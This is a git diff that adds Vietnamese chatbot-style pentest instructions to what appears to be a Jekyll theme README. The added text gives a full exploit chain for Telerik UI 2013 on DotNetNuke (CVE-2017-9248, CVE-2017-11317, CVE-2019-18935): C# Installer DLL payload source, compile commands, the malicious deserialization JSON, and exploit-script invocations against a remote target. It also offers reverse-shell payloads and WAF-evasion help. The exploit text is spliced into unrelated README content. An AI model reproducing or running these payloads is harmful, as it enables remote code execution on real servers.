@@ -378,5 +378,193 @@ Mẹo quan sát trực quan nhất trong Lab:
 Nếu bạn có quyền điều khiển màn hình máy Target (Windows), hãy bật công cụ Process Hacker hoặc Process Explorer. Khi bạn gửi payload thành công, bạn sẽ thấy tiến trình hfs.exe đẻ ra một tiến trình con là cmd.exe hoặc powershell.exe. Nếu thấy chúng xuất hiện rồi biến mất (hoặc chạy ngầm), bạn đã pentest thành công 100% dựa trên hành vi thực tế.
 Trong lab của bạn, mục tiêu cuối cùng của bạn là chỉ dừng lại ở mức chứng minh lỗ hổng (PoC) hay muốn leo thang đặc quyền / lấy Reverse Shell thành công? Nếu cần, tôi có thể cung cấp đoạn đóng gói mã hóa Base64 PowerShell tương thích hoàn toàn với cấu trúc macro của HFS để bạn test shell.
 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+Phiên bản Telerik UI for ASP.NET AJAX 2013.2.717.40 tích hợp trên nền tảng DotNetNuke (DNN) của bạn đang bị ảnh hưởng bởi chuỗi 3 lỗ hổng bảo mật nghiêm trọng: [1] (https://securitybox.vn/8039/mot-so-lo-hong-bao-mat-nghiem-trong-tren-telerik-ui-for-asp-net-ajax/)
+1. CVE-2017-9248: Rò rỉ khóa mã hóa qua tấn công Brute-force/Padding Oracle.
+2. CVE-2017-11317: Tải lên file tùy ý (Arbitrary File Upload) do cơ chế mã hóa yếu.
+3. CVE-2019-18935: Thực thi mã từ xa (RCE) thông qua Deserialization không an toàn. [1] (https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui), [2] (https://securitybox.vn/8039/mot-so-lo-hong-bao-mat-nghiem-trong-tren-telerik-ui-for-asp-net-ajax/)
+Dưới đây là các kịch bản và payload thực tế được cấu trúc để bạn thực hiện kiểm thử xâm nhập (Penetration Testing) nhằm chứng minh lỗ hổng cho hệ thống này.
+
+Bước 1: Thu thập thông tin & Xác định Endpoint
+
+Thành phần RadAsyncUpload của Telerik thường đăng ký một HTTP Handler nhận diện mục tiêu. Bạn cần kiểm tra xem đường dẫn sau có tồn tại và trả về phản hồi từ Telerik hay không:
+• URL mục tiêu: http://<target-dnn-domain>/Telerik.Web.UI.WebResource.axd?type=rau [1] (https://www.exploit-db.com/exploits/47793)
+
+Bước 2: Khai thác CVE-2017-9248 (Dò tìm mã khóa - Khởi đầu chuỗi RCE)
+
+Để tải file lên hoặc kích hoạt deserialization, bạn cần biết khóa Telerik.Web.UI.DialogParametersEncryptionKey. Với phiên bản 2013, khóa này có thể được dò tìm tự động bằng các công cụ mã nguồn mở. [1] (https://securitybox.vn/8039/mot-so-lo-hong-bao-mat-nghiem-trong-tren-telerik-ui-for-asp-net-ajax/)
+• Sử dụng Tool khôi phục Key: Bạn có thể dùng script Python telerik-decrypt của bao7uo để thực hiện gửi các request liên tiếp và bẻ khóa qua phản hồi khác biệt của server:bash
+python telerik-decrypt.py -u "http://<target>/Telerik.Web.UI.WebResource.axd?type=rau" -v 2013.2.717.40
+Hãy thận trọng khi sử dụng mã.
+• Kết quả thu được: Một chuỗi Hex đại diện cho Key mã hóa của hệ thống (Ví dụ: C0DE...).
+
+Bước 3: Chứng minh CVE-2017-11317 & CVE-2019-18935 (Khai thác RCE)
+
+Khi đã có Key từ Bước 2, bạn có thể thực hiện tải lên một file DLL bất hợp pháp và kích hoạt tính năng giải tuần tự hóa (JavaScriptSerializer) của Telerik để ép tiến trình w3wp.exe nạp thư viện này vào bộ nhớ. [1] (https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/common-allows-javascriptserializer-deserialization), [2] (https://www.exploit-db.com/exploits/47793)
+
+1. Tạo Payload DLL (Proof of Concept - Sleep Test)
+
+Sử dụng mã nguồn C# để biên dịch một file DLL hỗn hợp (Mixed-mode Assembly). Để chứng minh RCE an toàn, hãy sử dụng hàm Sleep thay vì chạy lệnh hệ thống:
+csharp
+using System;
+using System.ComponentModel;
+using System.Configuration.Install;
+using System.Threading;
+
+[RunInstaller(true)]
+public class Exploit : Installer
+{
+    public override void Install(System.Collections.IDictionary stateSaver)
+    {
+        base.Install(stateSaver);
+        // Khiến luồng xử lý của server dừng 10 giây để chứng minh code đã chạy
+        Thread.Sleep(10000); 
+    }
+}
+Hãy thận trọng khi sử dụng mã.
+Biên dịch file này thành một tệp có tên poc.dll.
+
+2. Cấu trúc Payload POST Request (Kích hoạt RCE)
+
+Để gửi tệp và kích hoạt thực thi, bạn cần gửi một request POST dạng JSON (sau đó được mã hóa bằng Key tìm được ở Bước 2) tới endpoint. [1] (https://www.exploit-db.com/exploits/47793)
+Cấu trúc đối tượng JSON gốc chưa mã hóa của tham số rauPostData sẽ tương tự như sau:
+json
+{
+    "Path": "C:\\Windows\\Temp\\poc.dll",
+    "TargetFolder": "C:\\Windows\\Temp\\",
+    "TempTargetFolder": "C:\\Windows\\Temp\\",
+    "AsyncUploadTypeName": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
+    "Content": "BASE64_CHUOI_NHI_PHAN_CUA_FILE_POC.DLL_TAI_DAY"
+}
+Hãy thận trọng khi sử dụng mã.
+• Công cụ hỗ trợ đóng gói tự động: Bạn nên sử dụng exploit script CVE-2019-18935 trên GitHub của noperator để tự động hóa việc mã hóa cấu trúc này. [1] (https://gist.github.com/ripp3rdoc/46e0309b8677876417743a87b103e49e)
+bash
+python cve-2019-18935.py -u http://<target>/Telerik.Web.UI.WebResource.axd?type=rau -p poc.dll -v 2013.2.717.40 -k <KEY_TIM_DUOC_O_BUOC_2>
+Hãy thận trọng khi sử dụng mã.
+• Dấu hiệu chứng minh thành công:
+	• Máy chủ mất chính xác hơn 10 giây (hoặc thời gian bạn cấu hình trong Thread.Sleep) mới phản hồi lại request HTTP POST.
+	• Trả về mã lỗi HTTP 500 Internal Server Error đi kèm phản hồi liên quan đến xử lý đối tượng. [1] (https://hackerone.com/reports/913695)
+
+Khuyến nghị khắc phục (Remediation)
+
+Nếu kết quả kiểm thử cho thấy hệ thống bị hoãn phản hồi (Sleep thành công), lỗ hổng này hoàn toàn tồn tại. Hãy tư vấn cho quản trị viên hệ thống triển khai ngay:
+1. Cập nhật Telerik UI: Nâng cấp lên phiên bản tối thiểu 2020.1.114 hoặc mới hơn để kích hoạt cơ chế Whitelist các kiểu dữ liệu an toàn (AllowedCustomMetaDataTypes).
+2. Vô hiệu hóa Handler tạm thời: Nếu chưa thể nâng cấp phiên bản, thêm cấu hình sau vào tệp web.config để chặn tính năng tải lên không đồng bộ: [1] (https://www.telerik.com/forums/cve-2019-18935), [2] (https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/common-allows-javascriptserializer-deserialization)
+xml
+<appSettings>
+    <add key="Telerik.Web.UI.RadAsyncUpload.DisableAsyncUploadHandler" value="true" />
+</appSettings>
+Hãy thận trọng khi sử dụng mã.
+Để tôi hỗ trợ bạn tốt hơn trong quá trình đánh giá, vui lòng cho biết:
+• Bạn đang chạy script kiểm thử trên môi trường Linux hay Windows?
+• Hệ thống mục tiêu có đang triển khai Web Application Firewall (WAF) nào ngăn chặn các request lạ không?
+
+Để thực hiện một quy trình kiểm thử xâm nhập (Penetration Testing) chuẩn xác và chuyên nghiệp từ xa vào hệ thống DotNetNuke (DNN) chạy Telerik UI 2013.2.717.40, bạn cần tuân thủ một quy trình chặt chẽ bao gồm 3 giai đoạn: Chuẩn bị môi trường & Biên dịch Payload, Khai thác chuỗi lỗ hổng (Workflow), và Xác thực kết quả.
+Dưới đây là cẩm nang kỹ thuật chi tiết đáp ứng toàn bộ các yêu cầu khắt khe để đảm bảo chứng minh thành công lỗ hổng RCE mà không làm treo hệ thống.
+
+PHẦN 1: YÊU CẦU CHẶT CHẼ VỀ MÔI TRƯỜNG & BIÊN DỊCH DLL (.NET)
+
+Thành phần JavaScriptSerializer trong lỗ hổng CVE-2019-18935 sẽ gọi Assembly.Load để nạp DLL vào bộ nhớ của tiến trình w3wp.exe (IIS). Để IIS chấp nhận và thực thi file DLL này từ xa, file DLL phải được biên dịch theo đúng các thông số kỹ thuật sau:
+
+1. Thông số cấu hình bắt buộc khi biên dịch:
+
+• Môi trường biên dịch: Windows (Bắt buộc phải có .NET Framework SDK). Bạn có thể dùng máy cá nhân hoặc máy ảo chạy Windows 10/11 hoặc Windows Server.
+• Phiên bản .NET Framework: .NET Framework 4.0 (hoặc tối đa là 4.5). Tuyệt đối không chọn .NET Core hoặc .NET 5/6/7/8 vì kiến trúc hoàn toàn khác biệt và IIS trên nền tảng DNN cũ sẽ từ chối nạp.
+• Target Architecture (Kiến trúc): Any CPU hoặc trùng khớp với cấu hình Pool của IIS mục tiêu (thường DNN chạy x64). Khuyến nghị để Any CPU.
+• Loại thư viện: Mixed-Mode Assembly (C# + C++ Managed) hoặc thuần C# nhưng triển khai qua Class Installer.
+
+2. Mã nguồn PoC C# an toàn (Safe Sleep Test)
+
+Tạo một file tên là Exploit.cs. Đoạn mã này sử dụng class Installer thuộc namespace System.Configuration.Install. Khi cơ chế Deserialization khởi tạo class này, hàm Install sẽ tự động được kích hoạt trước khi bất kỳ lỗi phân tích cú pháp nào xảy ra.
+csharp
+using System;
+using System.ComponentModel;
+using System.Configuration.Install;
+using System.Threading;
+using System.Diagnostics;
+
+[RunInstaller(true)]
+public class Exploit : Installer
+{
+    public override void Install(System.Collections.IDictionary stateSaver)
+    {
+        base.Install(stateSaver);
+        
+        // Payload 1: Khiến tiến trình IIS ngủ đông trong 15 giây để đo thời gian phản hồi (Time-based RCE)
+        Thread.Sleep(15000); 
+
+        // Payload 2 (Tùy chọn phụ): Tạo một file log đánh dấu để kiểm tra hộp đen nếu có quyền đọc write
+        try {
+            System.IO.File.WriteAllText(@"C:\Windows\Temp\dnn_vuln_proof.txt", "CVE-2019-18935 Successfully Executed at " + DateTime.Now.ToString());
+        } catch {}
+    }
+}
+Hãy thận trọng khi sử dụng mã.
+
+3. Câu lệnh biên dịch (Compile Command)
+
+Bạn không cần cài Visual Studio nặng nề. Chỉ cần mở Command Prompt (cmd) trên Windows và tìm đến trình biên dịch csc.exe mặc định của .NET Framework 4.0:
+cmd
+:: Di chuyển đến thư mục của .NET 4.0
+cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319
+
+:: Biên dịch file Exploit.cs thành file thư viện động poc.dll
+csc.exe /target:library /out:C:\path\to\your\output\poc.dll C:\path\to\your\source\Exploit.cs
+Hãy thận trọng khi sử dụng mã.
+Đảm bảo tệp poc.dll được tạo ra thành công và lưu lại đường dẫn tệp này trên máy của bạn.
+
+PHẦN 2: WORKFLOW & CÁC PAYLOAD KIỂM THỬ QUA TỪNG BƯỚC (REMOTE)
+
+Quy trình kiểm thử từ xa từ máy của bạn đến mục tiêu sẽ trải qua 3 bước logic liên kết chặt chẽ.
+
+BƯỚC 1: Kiểm tra tính khả dụng của Endpoint (RadAsyncUpload)
+
+Trước khi gửi payload nặng, gửi một yêu cầu GET đơn giản để xác nhận HTTP Handler của Telerik hoạt động.
+• Phương thức: GET
+• URL: http://<target-dnn-domain>/Telerik.Web.UI.WebResource.axd?type=rau
+• Payload phản hồi mong đợi: Server trả về một trang trắng hoặc lỗi HTTP 400 / 500 nhưng tiêu đề Response chứa các thông tin liên quan đến Telerik.Web.UI.
+
+BƯỚC 2: Khai thác CVE-2017-9248 để lấy Khóa Mã Hóa (Encryption Key)
+
+Telerik UI sử dụng một thuật toán mã hóa đối xứng để bảo vệ dữ liệu truyền tải (rauPostData). Phiên bản 2013 bị lỗi Padding Oracle/Brute-force. Bạn phải tìm được khóa này trước thì mới thực hiện được bước tải DLL.
+• Payload cấu trúc gửi đi: Các chuỗi byte mã hóa lỗi được gửi liên tiếp tới Endpoint nhằm thu thập phản hồi về thời gian hoặc thông báo lỗi (Padding Error).
+• Cách thực hiện từ xa: Sử dụng script Python telerik-decrypt.py.bash
+python telerik-decrypt.py -u "http://<target-dnn-domain>/Telerik.Web.UI.WebResource.axd?type=rau" -v 2013.2.717.40
+Hãy thận trọng khi sử dụng mã.
+• Yêu cầu đầu ra bắt buộc: Script phải trả về chuỗi Hex dài đại diện cho mã khóa, ví dụ: A1B2C3D4E5F6... (đây là khóa Telerik.Web.UI.DialogParametersEncryptionKey).
+
+BƯỚC 3: Đóng gói JSON Payload & Gửi yêu cầu kích hoạt RCE (CVE-2019-18935)
+
+Sau khi có Khóa mã hóa từ Bước 2 và file poc.dll từ Phần 1, bạn sẽ thực hiện đóng gói cấu trúc JSON.
+Cấu trúc đối tượng JSON độc hại (Chưa mã hóa) sẽ trông như thế này:
+json
+{
+    "Path": "C:\\Windows\\Temp\\poc.dll",
+    "TargetFolder": "C:\\Windows\\Temp\\",
+    "TempTargetFolder": "C:\\Windows\\Temp\\",
+    "AsyncUploadTypeName": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
+    "Content": "<CHUYỂN_ĐỔI_TOÀN_BỘ_FILE_POC.DLL_SANG_DẠNG_BASE64>"
+}
+Hãy thận trọng khi sử dụng mã.
+Workflow thực thi lệnh gửi Payload:
+Để đảm bảo Payload được mã hóa đúng thuật toán mã hóa của Telerik phiên bản 2013 với Khóa vừa tìm được, hãy chạy script cve-2019-18935.py:
+bash
+python cve-2019-18935.py \
+  -u "http://<target-dnn-domain>/Telerik.Web.UI.WebResource.axd?type=rau" \
+  -p "C:\path\to\your\output\poc.dll" \
+  -v "2013.2.717.40" \
+  -k "MÃ_KHÓA_HEX_THU_ĐƯỢC_Ở_BƯỚC_2"
+Hãy thận trọng khi sử dụng mã.
+
+PHẦN 3: TIÊU CHUẨN XÁC ĐỊNH BỊ LỖ HỔNG (XÁC THỰC RCE)
+
+Vì đây là môi trường kiểm thử hộp đen từ xa (không có quyền truy cập vào Server để xem trực tiếp), bạn phải dựa vào kỹ thuật Time-based (Đo lường thời gian phản hồi) để khẳng định 100% mã RCE đã được nạp và chạy thành công:
+1. Đo thời gian phản hồi cơ bản (Baseline): Các request thông thường gửi tới Endpoint chỉ mất từ 50ms - 300ms để nhận được phản hồi từ IIS.
+2. Đo thời gian phản hồi khi Payload RCE được gửi:
+	• Ngay khi lệnh gửi payload poc.dll ở Bước 3 được thực thi, tiến trình kết nối của bạn trên Terminal sẽ bị treo/giữ nguyên trạng thái chờ (Pending).
+	• Sử dụng đồng hồ bấm giờ, nếu thời gian từ lúc bấm Enter gửi payload đến lúc Server trả về kết quả kéo dài đúng hoặc hơn 15 giây (Bằng với thời gian Thread.Sleep(15000) cài đặt trong DLL), thì đây là bằng chứng không thể chối cãi cho thấy mã lệnh của bạn đã được CPU của Server thực thi trực tiếp thông qua lỗ hổng Deserialization.
+	• Phản hồi trả về thường là mã lỗi HTTP 500 (Internal Server Error) đi kèm với thông báo lỗi ép kiểu (do sau khi chạy hàm Install xong, luồng Deserialization thông thường của Telerik bị gián đoạn và crash). Đây là phản hồi thành công đối với một cuộc thử nghiệm RCE.
+Hãy tiến hành biên dịch tệp DLL theo các bước trên. Trong quá trình chạy script Python để dò tìm khóa ở Bước 2, nếu bạn gặp lỗi kết nối hoặc thời gian phản hồi (Timeout) từ phía mục tiêu, hãy gửi thông tin lỗi đó tại đây để tôi hỗ trợ bạn tùy chỉnh cấu hình HTTP Request (User-Agent, Proxy, Chặn WAF) cho phù hợp.
+
 I'd also like to thank [Dr. Jekyll's Themes](https://drjekyllthemes.github.io/), [Jekyll Themes](http://jekyllthemes.org/), and another [Jekyll Themes](http://jekyllrc.github.io/jekyllthemes/) for featuring Beautiful Jekyll in their Jekyll theme directories.
 
